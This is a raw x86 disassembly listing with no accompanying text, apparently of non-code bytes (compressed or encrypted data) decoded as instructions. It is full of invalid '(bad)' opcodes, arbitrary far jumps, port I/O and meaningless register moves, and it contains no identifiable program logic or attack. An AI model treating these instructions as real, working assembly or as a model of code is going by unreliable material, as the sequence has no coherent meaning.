  42ca8c:	mov    ebp,0x5d8c52
	...
  42caf1:	add    BYTE PTR [eax],al
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x51cd6ec0]
  42cb02:	std    
  42cb03:	pop    ebp
  42cb04:	cld    
  42cb05:	fld    QWORD PTR [ecx]
  42cb07:	add    BYTE PTR [ecx+eax*1],al
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	faddp  st(1),st
  42cb0e:	pop    ds
  42cb0f:	aaa    
  42cb10:	cmp    al,0xbe
  42cb12:	or     al,0xf6
  42cb14:	inc    eax
  42cb15:	std    
  42cb16:	add    edx,DWORD PTR [edx+0x3d]
  42cb19:	js     0x42cb6c
  42cb1b:	mov    ah,0xb8
  42cb1d:	dec    ebx
  42cb1e:	sahf   
  42cb1f:	adc    dh,dh
  42cb21:	call   0x6018:0xaa1c8eec
  42cb28:	je     0x42cb8a
  42cb2a:	js     0x42cab9
  42cb2c:	ds loopne 0x42cb5a
  42cb2f:	jle    0x42cba8
  42cb31:	out    dx,al
  42cb32:	inc    eax
  42cb33:	add    BYTE PTR [edi+0x8d686bd],bl
  42cb39:	push   esi
  42cb3a:	inc    edi
  42cb3b:	out    dx,eax
  42cb3c:	xor    BYTE PTR [eax],al
  42cb3e:	repnz ins BYTE PTR es:[edi],dx
  42cb40:	jbe    0x42cb90
  42cb42:	pop    esp
  42cb43:	sub    ch,BYTE PTR [esi+0xd]
  42cb46:	aad    0xa5
  42cb48:	pop    ds
  42cb49:	mov    ?,edx
  42cb4b:	das    
  42cb4c:	std    
  42cb4d:	pushf  
  42cb4e:	test   eax,0x764ddaa1
  42cb53:	popa   
  42cb54:	jge    0x42caf0
  42cb56:	mov    BYTE PTR cs:[ebp-0x34cce23f],ah
  42cb5d:	pop    es
  42cb5e:	retf   
  42cb5f:	mov    BYTE PTR [edx+0xfe26801],ch
  42cb65:	cld    
  42cb66:	ror    DWORD PTR [edi],1
  42cb68:	dec    ecx
  42cb69:	ja     0x42cb46
  42cb6b:	jecxz  0x42cb18
  42cb6d:	mov    dl,0x80
  42cb6f:	dec    ebx
  42cb70:	inc    ebx
  42cb71:	or     cl,BYTE PTR [ecx-0x2e]
  42cb74:	out    0x4a,eax
  42cb76:	mov    eax,0x6988a468
  42cb7b:	and    eax,DWORD PTR [edi]
  42cb7d:	in     al,dx
  42cb7e:	xchg   ebp,eax
  42cb7f:	mov    al,ds:0x762e57aa
  42cb84:	push   ss
  42cb85:	stc    
  42cb86:	jp     0x42cbdd
  42cb88:	jmp    0x42cb93
  42cb8a:	push   ss
  42cb8b:	xlat   BYTE PTR ds:[ebx]
  42cb8c:	bound  esi,QWORD PTR [ecx]
  42cb8e:	xor    BYTE PTR [esi-0x27],al
  42cb91:	outs   dx,BYTE PTR ds:[esi]
  42cb92:	jl     0x42cb8e
  42cb94:	ins    BYTE PTR es:[edi],dx
  42cb95:	dec    ebp
  42cb96:	adc    DWORD PTR [edi+ebp*4+0x5a],eax
  42cb9a:	shl    BYTE PTR [ebx],1
  42cb9c:	into   
  42cb9d:	ss pop ss
  42cb9f:	xchg   edi,eax
  42cba0:	mov    al,ds:0x442e4d27
  42cba5:	jb     0x42cc0e
  42cba7:	cmp    edi,eax
  42cba9:	sar    DWORD PTR [ebp+0x69881a6d],1
  42cbaf:	pop    edx
  42cbb0:	int3   
  42cbb1:	dec    ebp
  42cbb2:	or     WORD PTR [ecx],di
  42cbb5:	(bad)  
  42cbb6:	jl     0x42cbae
  42cbb8:	add    ch,cl
  42cbba:	sub    eax,0xd5e02264
  42cbbf:	cmc    
  42cbc0:	(bad)  
  42cbc1:	ficom  DWORD PTR [ebx+eax*4-0x32]
  42cbc5:	xor    dl,BYTE PTR [ebx-0x6d]
  42cbc8:	jb     0x42cbd0
  42cbca:	mov    edx,0x40d8b276
  42cbcf:	mov    bl,BYTE PTR [edx-0x6e2aacad]
  42cbd5:	std    
  42cbd6:	jne    0x42cc2b
  42cbd8:	mov    dh,0x3b
  42cbda:	jecxz  0x42cb71
  42cbdc:	std    
  42cbdd:	ret    0xcbc1
  42cbe0:	dec    edi
  42cbe1:	add    ebp,ebp
  42cbe3:	lods   al,BYTE PTR ds:[esi]
  42cbe4:	mov    ?,WORD PTR ds:0x703167b
  42cbea:	rol    bl,0x71
  42cbed:	sub    cl,BYTE PTR [edi+0x7f]
  42cbf0:	js     0x42cbf3
  42cbf2:	add    bl,bl
  42cbf4:	loop   0x42cc06
  42cbf6:	lds    edi,FWORD PTR [ecx+esi*2+0x58]
  42cbfa:	scas   al,BYTE PTR es:[edi]
  42cbfb:	mov    edi,0x58499990
  42cc00:	cld    
  42cc01:	(bad)  
  42cc02:	jle    0x42cc5b
  42cc04:	mov    ds:0x532c4f92,eax
  42cc09:	lods   al,BYTE PTR ds:[esi]
  42cc0a:	and    al,0x9a
  42cc0c:	imul   edx,DWORD PTR [ecx-0x2a],0xffffffa7
	...
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x22123725
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	test   dl,0x23
  42cc8f:	mov    ebx,0x2dd84134
  42cc94:	sub    DWORD PTR [edi+ebp*4],0xdfa76a83
  42cc9b:	xchg   ebx,eax
  42cc9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc9d:	push   0x39e6d09
  42cca2:	sub    al,0xdd
  42cca4:	mov    ds,edi
  42cca6:	xor    eax,0x3f077225
  42ccab:	and    eax,0x509062aa
  42ccb0:	push   esi
  42ccb1:	mov    edi,DWORD PTR [edx+ecx*2-0x7a061e1a]
  42ccb8:	sbb    al,0xac
  42ccba:	adc    eax,0xcf73838a
  42ccbf:	mov    ds:0x5dbcf876,eax
  42ccc4:	adc    edi,ebp
  42ccc6:	or     DWORD PTR [edx],ebp
  42ccc8:	push   eax
  42ccc9:	pop    es
  42ccca:	add    dh,BYTE PTR ds:0x37c111fa
  42ccd0:	call   0xa9f6142a
  42ccd5:	add    BYTE PTR [eax-0x58],ch
  42ccd8:	dec    ebx
  42ccd9:	push   ebx
  42ccda:	clc    
  42ccdb:	push   ebx
  42ccdc:	push   cs
  42ccdd:	loop   0x42ccc3
  42ccdf:	push   edi
  42cce0:	jo     0x42cd60
  42cce2:	or     DWORD PTR [ebp-0x27],esi
  42cce5:	test   eax,0x4f528669
  42ccea:	xor    al,ch
  42ccec:	into   
  42cced:	mov    DWORD PTR [edi-0x3f8fe52e],ecx
  42ccf3:	or     edx,DWORD PTR [ebp+0x42ed4e85]
  42ccf9:	mov    esp,0x15a23d1f
  42ccfe:	pop    ebp
  42ccff:	pop    ss
  42cd00:	cmp    eax,0x1a586689
  42cd05:	inc    ebx
  42cd06:	ins    DWORD PTR es:[edi],dx
  42cd07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd08:	stos   DWORD PTR es:[edi],eax
  42cd09:	(bad)  
  42cd0a:	cmp    DWORD PTR [edi+0x5a063dfd],edx
  42cd10:	inc    esi
  42cd11:	daa    
  42cd12:	add    ch,cl
  42cd14:	ret    
  42cd15:	push   esi
  42cd16:	in     eax,0xa8
  42cd18:	or     ebp,0xffffffde
  42cd1b:	rcr    DWORD PTR [edi],cl
  42cd1d:	inc    eax
  42cd1e:	gs es dec eax
  42cd21:	mov    eax,ds:0xb4ad68f7
  42cd26:	leave  
  42cd27:	loopne 0x42ccc9
  42cd29:	shl    DWORD PTR [edi],cl
  42cd2b:	hlt    
  42cd2c:	stc    
  42cd2d:	cmp    ah,BYTE PTR [edx-0x3f]
  42cd30:	(bad)  
  42cd31:	sar    DWORD PTR [eax],0x1f
  42cd34:	pop    eax
  42cd35:	xchg   ecx,eax
  42cd36:	xor    eax,0xde516fab
  42cd3b:	pop    es
  42cd3c:	sbb    eax,0xb92aa2c
  42cd41:	mov    bh,0x7f
  42cd43:	push   cs
  42cd44:	mov    ebp,0x2ae44aab
  42cd49:	dec    edi
  42cd4a:	pop    edx
  42cd4b:	pop    edx
  42cd4c:	push   esi
  42cd4d:	mov    DWORD PTR [ecx],ebx
  42cd4f:	xchg   ebp,eax
  42cd50:	mov    esi,DWORD PTR [ecx+ebx*2+0x2a]
  42cd54:	test   eax,0xab11d0bc
  42cd59:	pop    ebx
  42cd5a:	loop   0x42cdbf
  42cd5c:	xor    bh,BYTE PTR [esi]
  42cd5e:	rcl    BYTE PTR [edi-0x67],0x6
  42cd62:	cwde   
  42cd63:	out    0x42,eax
  42cd65:	fwait
  42cd66:	push   cs
  42cd67:	inc    edi
  42cd68:	mov    fs,ebp
  42cd6a:	lea    esi,[ecx+0x38]
  42cd6d:	sti    
  42cd6e:	dec    edx
  42cd6f:	mov    BYTE PTR [ebp-0x82ab5ad],dl
  42cd75:	push   cs
  42cd76:	xor    BYTE PTR [edi],bl
  42cd78:	sub    al,0x3f
  42cd7a:	sub    al,0x37
  42cd7c:	imul   edi,DWORD PTR [esi+eiz*1],0xfde35059
  42cd83:	shl    DWORD PTR [ebx-0x33c5fd44],0x2c
  42cd8a:	nop
  42cd8b:	das    
  42cd8c:	mov    dh,0x85
  42cd8e:	sbb    dh,BYTE PTR [esi+0x0]
	...
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x29
  42ce01:	out    0xfe,eax
  42ce03:	mov    eax,ds:0x1e004
  42ce08:	add    al,0x1
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	adc    eax,0xf0314285
  42ce11:	rcl    BYTE PTR [edi],cl
  42ce13:	call   0x22279620
  42ce18:	(bad)  
  42ce19:	into   
  42ce1a:	nop
  42ce1b:	adc    DWORD PTR [edi-0x3ba8fcef],ebp
  42ce21:	mov    ah,BYTE PTR [ebp-0x2]
  42ce24:	imul   eax,DWORD PTR ds:0xb523e539,0xffffffb5
  42ce2b:	and    DWORD PTR [edx+ecx*2-0x131c390],0x153d786f
  42ce36:	ins    BYTE PTR es:[edi],dx
  42ce37:	pop    ecx
  42ce38:	push   es
  42ce39:	sub    DWORD PTR [ecx-0x29],eax
  42ce3c:	std    
  42ce3d:	not    al
  42ce3f:	int    0x8a
  42ce41:	mov    dl,0x1
  42ce43:	xchg   esp,eax
  42ce44:	xchg   edi,eax
  42ce45:	adc    al,0xdb
  42ce47:	sbb    bh,BYTE PTR [eax]
  42ce49:	cmp    eax,0x739b6131
  42ce4e:	retf   
  42ce4f:	adc    eax,0x626d89fa
  42ce54:	cdq    
  42ce55:	shl    DWORD PTR [edx],cl
  42ce57:	fild   DWORD PTR [edi]
  42ce59:	sahf   
  42ce5a:	mov    edx,0x619ca3fc
  42ce5f:	sbb    dh,BYTE PTR [ebx-0x7d29fb93]
  42ce65:	push   0x14
  42ce67:	mov    ch,0xd
  42ce69:	out    dx,al
  42ce6a:	mov    ah,0x4d
  42ce6c:	stos   BYTE PTR es:[edi],al
  42ce6d:	rcl    DWORD PTR [ebp-0x43],0xcd
  42ce71:	sbb    DWORD PTR [ebx-0x3874bdf0],edx
  42ce77:	leave  
  42ce78:	and    BYTE PTR [esi-0x1c],0xb5
  42ce7c:	xchg   ebx,eax
  42ce7d:	inc    edx
  42ce7e:	mov    dh,0xd2
  42ce80:	popf   
  42ce81:	cli    
  42ce82:	inc    ebp
  42ce83:	lock mov edx,0xa3def4d1
  42ce89:	fnstsw WORD PTR [esi]
  42ce8b:	pop    edx
  42ce8c:	in     eax,dx
  42ce8d:	cmp    al,0xeb
  42ce8f:	jns    0x42ce63
  42ce91:	out    0x38,eax
  42ce93:	cdq    
  42ce94:	repnz pop edx
  42ce96:	out    0x40,eax
  42ce98:	mov    ds:0x23acd729,eax
  42ce9d:	lock mov eax,0xda597ca3
  42cea3:	mov    dh,0x3a
  42cea5:	mov    al,0xde
  42cea7:	push   0x75005c74
  42ceac:	jp     0x42ced3
  42ceae:	out    dx,al
  42ceaf:	cwde   
  42ceb0:	xchg   ebx,eax
  42ceb1:	jp     0x42cf03
  42ceb3:	add    esp,0xdae258b
  42ceb9:	jmp    0x42cee8
  42cebb:	mov    ss,WORD PTR [ecx]
  42cebd:	mov    al,0x9d
  42cebf:	loop   0x42ce5b
  42cec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cec2:	call   esi
  42cec4:	test   eax,0x14ac181a
  42cec9:	push   edx
  42ceca:	sbb    al,0x2
  42cecc:	sbb    eax,0x83a16681
  42ced1:	fstp   TBYTE PTR [ecx-0x50ff9815]
  42ced7:	dec    ebx
  42ced8:	mov    ah,0xa7
  42ceda:	call   0x7722:0x8e481a0
  42cee1:	bound  edi,QWORD PTR [eax]
  42cee3:	push   edx
  42cee4:	sbb    ebp,DWORD PTR [edi+ecx*1+0x5]
  42cee8:	popf   
  42cee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ceea:	adc    eax,DWORD PTR ds:[edx+0x1c]
  42ceee:	bound  esp,QWORD PTR [eax+0x58]
  42cef1:	dec    ebp
  42cef2:	xlat   BYTE PTR ds:[ebx]
  42cef3:	in     al,dx
  42cef4:	push   edi
  42cef5:	xchg   ecx,eax
  42cef6:	push   ebx
  42cef7:	sbb    eax,0x629977f8
  42cefc:	lods   al,BYTE PTR ds:[esi]
  42cefd:	add    ecx,DWORD PTR [ebp+edx*4-0x4ac4e986]
  42cf04:	inc    esi
  42cf05:	sbb    bl,BYTE PTR [ecx]
  42cf07:	xor    eax,0x9035e4bb
  42cf0c:	loope  0x42cf27
  42cf0e:	std    
  42cf0f:	aad    0x0
	...
  42cf71:	add    BYTE PTR [eax],al
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	(bad)  
  42cf80:	iret   
  42cf81:	aad    0xe4
  42cf83:	test   BYTE PTR [eax],0xe1
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    al,0x1
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	inc    eax
  42cf8d:	in     al,0xa8
  42cf8f:	fdiv   DWORD PTR [esi]
  42cf91:	or     DWORD PTR [ebp-0x78],esp
  42cf94:	xor    eax,0xce5d25b8
  42cf99:	and    dh,ch
  42cf9b:	xchg   edi,eax
  42cf9c:	fisttp QWORD PTR [edi+0x10]
  42cf9f:	sub    esp,ecx
  42cfa1:	jge    0x42cfa2
  42cfa3:	pop    eax
  42cfa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cfa5:	jbe    0x42cff3
  42cfa7:	je     0x42cfd8
  42cfa9:	aam    0x3
  42cfab:	mov    ch,ch
  42cfad:	jmp    FWORD PTR [esi]
  42cfaf:	cmp    edx,DWORD PTR [eax-0x1f]
  42cfb2:	jmp    0xae5c4358
  42cfb7:	je     0x42cff4
  42cfb9:	cmp    BYTE PTR [eax+0x27814896],bh
  42cfbf:	sahf   
  42cfc0:	leave  
  42cfc1:	or     edi,eax
  42cfc3:	mov    dh,0x6b
  42cfc5:	call   0x141c66ab
  42cfca:	inc    ebx
  42cfcb:	push   esp
  42cfcc:	shl    BYTE PTR [eax-0x7d9a84f6],1
  42cfd2:	or     al,0x8b
  42cfd4:	icebp  
  42cfd5:	inc    edi
  42cfd6:	fadd   QWORD PTR [eax]
  42cfd8:	push   edi
  42cfd9:	push   esi
  42cfda:	fist   DWORD PTR [esi-0x5d]
  42cfdd:	add    al,0xfb
  42cfdf:	rcl    DWORD PTR [esp+ecx*8],1
  42cfe2:	test   DWORD PTR [ecx+0x7e0bc7c7],esp
  42cfe8:	loope  0x42cf95
  42cfea:	push   esp
  42cfeb:	jae    0x42d02d
  42cfed:	cmp    edx,DWORD PTR [edx+0x4c]
  42cff0:	loopne 0x42d05a
  42cff2:	mov    WORD PTR [ecx],cs
  42cff4:	mov    ah,0x6f
  42cff6:	jle    0x42cfb2
  42cff8:	xchg   ebx,eax
  42cff9:	xor    BYTE PTR [bp+si-0x31],bl
  42cffd:	push   ss
  42cffe:	sub    BYTE PTR [ebx-0x65],cl
  42d001:	xlat   BYTE PTR ds:[ebx]
  42d002:	or     esi,DWORD PTR [esi+esi*8-0xe]
  42d006:	dec    esp
  42d007:	ds jns 0x42d00e
  42d00a:	sbb    DWORD PTR [ebx],ecx
  42d00c:	mov    al,0x9f
  42d00e:	inc    esi
  42d00f:	and    bl,cl
  42d011:	inc    eax
  42d012:	out    0x1d,al
  42d014:	das    
  42d015:	jb     0x42d020
  42d017:	add    al,0x7e
  42d019:	rcl    DWORD PTR [ebp+0x20],0xbe
  42d01d:	stc    
  42d01e:	jecxz  0x42cfab
  42d020:	dec    ebx
  42d021:	lods   al,BYTE PTR ds:[esi]
  42d022:	sub    ebp,eax
  42d024:	icebp  
  42d025:	or     al,0x58
  42d027:	mov    ebp,0x11cc8644
  42d02c:	cdq    
  42d02d:	pop    esp
  42d02e:	mov    WORD PTR [esi-0x30bbdf9],ss
  42d034:	mov    al,cl
  42d036:	adc    al,0xf1
  42d038:	fld    DWORD PTR [ebx]
  42d03a:	jno    0x42cfe5
  42d03c:	sub    eax,0x82f2367e
  42d041:	pop    ecx
  42d042:	push   ss
  42d043:	pop    ebp
  42d044:	sbb    BYTE PTR [esi],ch
  42d046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d047:	cwde   
  42d048:	inc    ebp
  42d049:	pushf  
  42d04a:	dec    ebx
  42d04b:	int    0x5a
  42d04d:	dec    esi
  42d04e:	out    0x80,al
  42d050:	push   edi
  42d051:	imul   edx,DWORD PTR [edi-0x71bd8962],0xffdda973
  42d05b:	mov    edx,0xc02ffb14
  42d060:	out    dx,al
  42d061:	pushf  
  42d062:	fsub   QWORD PTR [ebp-0x5]
  42d065:	adc    DWORD PTR [edx+edx*2+0x263b1923],esp
  42d06c:	ins    DWORD PTR es:[edi],dx
  42d06d:	cmp    edi,0x79
  42d070:	xchg   edi,eax
  42d071:	cmp    bh,bl
  42d073:	retf   0x6a75
  42d076:	fwait
  42d077:	and    al,bl
  42d079:	rol    DWORD PTR [eax-0x47],0xcd
  42d07d:	in     eax,dx
  42d07e:	leave  
  42d07f:	sbb    DWORD PTR [edx],0x86050f28
  42d085:	in     al,dx
  42d086:	add    eax,0xada0a047
  42d08b:	cli    
  42d08c:	xchg   ebp,eax
  42d08d:	sar    BYTE PTR [ebx+0x89],cl
	...
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    dh,dh
  42d101:	adc    esi,ebx
  42d103:	or     DWORD PTR [edx+eiz*8],0x1040001
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	push   ebp
  42d10d:	add    bl,bh
  42d10f:	mov    ebp,0x804aa746
  42d114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d115:	dec    ebx
  42d116:	mov    ecx,0x751e2b0f
  42d11b:	push   ecx
  42d11c:	xchg   ebx,eax
  42d11d:	pop    esi
  42d11e:	outs   dx,BYTE PTR ds:[esi]
  42d11f:	fst    st(7)
  42d121:	sub    eax,0x728ccfd
  42d126:	jbe    0x42d192
  42d128:	(bad)  
  42d129:	in     al,dx
  42d12a:	sbb    ch,bl
  42d12c:	fnstsw WORD PTR ds:0x3e3b5570
  42d132:	pop    ebx
  42d133:	xor    esp,DWORD PTR ds:0x8f8c2cf0
  42d139:	outs   dx,DWORD PTR ds:[esi]
  42d13b:	or     al,0x74
  42d13d:	jnp    0x42d153
  42d13f:	adc    al,0xfb
  42d141:	in     al,0x5
  42d143:	jo     0x42d11d
  42d145:	loopne 0x42d192
  42d147:	push   esi
  42d148:	pop    edi
  42d149:	sub    al,0x54
  42d14b:	inc    eax
  42d14c:	mov    bl,0x28
  42d14e:	push   ebp
  42d14f:	add    eax,0x127c32c0
  42d154:	pop    ecx
  42d155:	ret    
  42d156:	or     al,0x94
  42d158:	ins    BYTE PTR es:[edi],dx
  42d159:	iret   
  42d15a:	retf   0x4a89
  42d15d:	pop    edx
  42d15e:	scas   eax,DWORD PTR es:[edi]
  42d15f:	add    dh,ah
  42d161:	xchg   esp,eax
  42d162:	mov    dl,0x1e
  42d164:	rcr    BYTE PTR [ebp-0x4e],1
  42d167:	sti    
  42d168:	push   ebx
  42d169:	aaa    
  42d16a:	xor    al,0xb9
  42d16c:	adc    BYTE PTR [esi+ebx*2-0x18c1054f],0xc7
  42d174:	jmp    0x4da5:0x8daf36ad
  42d17b:	enter  0xce42,0xaf
  42d17f:	xchg   esi,eax
  42d180:	jbe    0x42d1aa
  42d182:	aaa    
  42d183:	stos   DWORD PTR es:[edi],eax
  42d184:	mov    ds:0x583cf4ba,eax
  42d189:	cmp    eax,0x5ce296ac
  42d18e:	repnz pop edi
  42d190:	add    eax,0x751c30b0
  42d195:	test   BYTE PTR [ecx+0x21],cl
  42d198:	mov    cl,0xc2
  42d19a:	mov    al,ds:0xaea3399
  42d19f:	clc    
  42d1a0:	sbb    al,0x12
  42d1a2:	pop    ebp
  42d1a3:	test   eax,0x44e6181f
  42d1a8:	loop   0x42d153
  42d1aa:	mov    DWORD PTR [edi+0x6393c4bf],eax
  42d1b0:	ficom  WORD PTR [ebx+0x2ffc9c56]
  42d1b6:	inc    ebp
  42d1b7:	pop    ss
  42d1b8:	sub    BYTE PTR [edi-0x6c],0xbe
  42d1bc:	shl    DWORD PTR [eax],1
  42d1be:	add    esi,DWORD PTR [ebx+0x1e]
  42d1c1:	jmp    0x4a046b2e
  42d1c6:	std    
  42d1c7:	xchg   esp,eax
  42d1c8:	stos   BYTE PTR es:[edi],al
  42d1c9:	sub    esp,DWORD PTR [ecx+0x79]
  42d1cc:	out    0x82,eax
  42d1ce:	(bad)  
  42d1d0:	shl    BYTE PTR [ecx+esi*8-0x53dabdb9],0x1d
  42d1d8:	xchg   edi,eax
  42d1d9:	in     al,0x63
  42d1db:	bound  ebp,QWORD PTR [edx-0x36aa235]
  42d1e1:	aad    0x8b
  42d1e3:	sbb    BYTE PTR [edi-0x51bea666],ch
  42d1e9:	mov    al,ds:0x58bf9dc1
  42d1ee:	dec    edx
  42d1ef:	jmp    0xc2264c48
  42d1f4:	ds ja  0x42d209
  42d1f7:	cld    
  42d1f8:	cmp    DWORD PTR [esi-0x48],ebx
  42d1fb:	mov    WORD PTR [ecx],gs
  42d1fd:	aad    0xf0
  42d1ff:	adc    BYTE PTR [ecx+ebx*1],al
  42d202:	daa    
  42d203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d204:	sbb    al,0xab
  42d206:	jmp    0x42d18d
  42d208:	imul   ebp,edx,0xa484f204
  42d20e:	sbb    al,BYTE PTR [eax+eax*1+0x0]
	...
  42d272:	add    BYTE PTR [eax],al
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d2b9
  42d281:	arpl   bx,bp
  42d283:	dec    edi
  42d284:	adc    bl,ah
  42d286:	add    DWORD PTR [eax],eax
  42d288:	add    al,0x1
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	pusha  
  42d28d:	inc    ebp
  42d28e:	es sti 
  42d290:	shl    BYTE PTR [esi],1
  42d292:	inc    eax
  42d293:	jne    0x42d26d
  42d295:	cmc    
  42d296:	out    0x1a,al
  42d298:	push   0x9004fc3d
  42d29d:	shl    DWORD PTR [ebx+0x4d48c6b1],0x89
  42d2a4:	sbb    BYTE PTR [ebx],ah
  42d2a6:	dec    ebx
  42d2a7:	xchg   ebp,eax
  42d2a8:	pop    edx
  42d2a9:	sti    
  42d2aa:	scas   eax,DWORD PTR es:[edi]
  42d2ab:	sbb    ah,bl
  42d2ad:	xchg   esp,eax
  42d2ae:	mov    ah,0xb9
  42d2b0:	shr    al,0x28
  42d2b3:	iret   
  42d2b4:	lahf   
  42d2b5:	xchg   edi,eax
  42d2b6:	add    al,0x31
  42d2b8:	and    DWORD PTR [ebp+0x0],esi
  42d2bb:	xor    dl,cl
  42d2bd:	cmp    dh,BYTE PTR [edx+eax*1+0x4989c3f0]
  42d2c4:	cmp    ebp,0xffffff86
  42d2c7:	dec    ebp
  42d2c8:	or     eax,0x5dc4371b
  42d2cd:	ja     0x42d321
  42d2cf:	push   ecx
  42d2d0:	jl     0x42d304
  42d2d2:	ds push 0xe72ea9e6
  42d2d8:	push   ecx
  42d2d9:	pop    ecx
  42d2da:	mov    ebp,0x94df2700
  42d2df:	aad    0x1b
  42d2e1:	push   eax
  42d2e2:	lds    edi,FWORD PTR [ecx+esi*2+0x215ce87f]
  42d2e9:	sub    al,0x90
  42d2eb:	inc    edx
  42d2ec:	add    cl,BYTE PTR [ecx-0x34169fe9]
  42d2f2:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  42d2f4:	mov    dl,BYTE PTR [ecx+eiz*4+0x300e5df7]
  42d2fb:	push   cs
  42d2fc:	repz pop ebp
  42d2fe:	cmp    DWORD PTR [edx],eax
  42d300:	outs   dx,BYTE PTR ds:[esi]
  42d301:	lods   eax,DWORD PTR ds:[esi]
  42d302:	loopne 0x42d2d7
  42d304:	clc    
  42d305:	lds    esp,FWORD PTR [ecx]
  42d307:	mov    dl,0xbf
  42d309:	mov    dh,cl
  42d30b:	hlt    
  42d30c:	sbb    DWORD PTR [edi],ecx
  42d30e:	int    0x6e
  42d310:	xchg   edi,eax
  42d311:	shr    al,0xec
  42d314:	std    
  42d315:	push   eax
  42d316:	inc    ecx
  42d317:	addr16 mov ecx,0x21f1daaa
  42d31d:	adc    BYTE PTR es:[eax-0x5c92d691],0x35
  42d325:	mov    cs,WORD PTR [edi-0x2245acf6]
  42d32b:	(bad)  
  42d32c:	(bad)  
  42d32d:	fldenv [edx-0x7]
  42d330:	call   0xcd360e4a
  42d335:	sub    BYTE PTR [edi],0x42
  42d338:	ja     0x42d391
  42d33a:	arpl   WORD PTR [ecx],dx
  42d33c:	ret    
  42d33d:	test   al,0x4c
  42d33f:	sub    al,0xa3
  42d341:	sbb    al,0x1d
  42d343:	lea    ecx,[esi+0x64]
  42d346:	add    al,0xaa
  42d348:	call   0x36f6:0x63fffd52
  42d34f:	jmp    0x9f37:0x9f4bf213
  42d356:	pop    eax
  42d357:	sahf   
  42d358:	imul   esi,DWORD PTR [ebp+esi*4-0x79],0x295e7b4
  42d360:	xor    ebp,DWORD PTR [edx]
  42d362:	add    al,0x8f
  42d364:	mov    bl,0x27
  42d366:	dec    eax
  42d367:	aaa    
  42d368:	adc    BYTE PTR [edx+edx*8-0x383e0e94],0x6b
  42d370:	rcr    edx,0x14
  42d373:	adc    DWORD PTR [ecx+eiz*8+0x59e26e58],eax
  42d37a:	adc    eax,0x1b13a525
  42d37f:	push   ebx
  42d380:	imul   ecx,DWORD PTR [ebx+0x2f],0x534544ca
  42d387:	int3   
  42d388:	fwait
  42d389:	pop    ecx
  42d38a:	jle    0x42d30f
  42d38c:	push   ecx
  42d38d:	cld    
  42d38e:	icebp  
  42d38f:	jg     0x42d391
	...
  42d3f1:	add    BYTE PTR [eax],al
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	inc    edi
  42d401:	pushf  
  42d402:	call   0x400:0x1e4145c
  42d409:	add    DWORD PTR [eax],eax
  42d40b:	add    BYTE PTR [eax+0x7],dl
  42d40e:	mov    eax,ds:0x4570be87
  42d413:	test   DWORD PTR [esi],ebp
  42d415:	jp     0x42d480
  42d417:	fucomip st,st(7)
  42d419:	inc    eax
  42d41a:	push   esp
  42d41b:	lea    esp,[edi]
  42d41d:	test   al,0xdf
  42d41f:	leave  
  42d420:	in     al,dx
  42d421:	inc    edi
  42d422:	adc    cl,ah
  42d424:	mov    ecx,0x9d79f739
  42d429:	cmc    
  42d42a:	les    eax,FWORD PTR [ecx]
  42d42c:	or     al,BYTE PTR [edi]
  42d42e:	fdivr  QWORD PTR [ebx-0x73]
  42d431:	jg     0x42d3ea
  42d433:	push   cs
  42d434:	(bad)  
  42d436:	in     al,0xe1
  42d438:	sahf   
  42d439:	inc    ebx
  42d43a:	jbe    0x42d3f8
  42d43c:	call   DWORD PTR [edi+0x6d]
  42d43f:	xchg   ebx,eax
  42d440:	push   esi
  42d441:	mov    ch,0x4d
  42d443:	fadd   DWORD PTR [ebx-0x9]
  42d446:	mov    WORD PTR [ebp+ecx*4-0x43d9c43a],fs
  42d44d:	sbb    al,0x23
  42d450:	sub    eax,0xbd59c7fd
  42d455:	mov    esi,DWORD PTR [ebp-0xb]
  42d458:	add    ebx,DWORD PTR ds:[ebx]
  42d45b:	sbb    dl,BYTE PTR [edx-0x50]
  42d45e:	sbb    ecx,DWORD PTR [ecx]
  42d460:	arpl   si,bp
  42d462:	aas    
  42d463:	in     eax,0x43
